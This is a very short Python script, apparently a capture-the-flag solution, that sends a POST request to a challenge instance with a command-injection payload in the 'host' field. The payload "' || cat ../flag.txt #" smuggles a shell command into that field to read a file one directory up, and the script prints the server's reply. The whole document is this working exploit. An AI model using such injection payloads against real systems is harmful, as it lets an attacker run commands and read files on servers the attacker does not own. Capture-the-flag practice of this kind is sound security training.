import requests

payload = "' || cat ../flag.txt #"

req = requests.post(f"https://inst-71bndobj52.web.vuln.si/", data = {"host" : payload})
print(req.text)
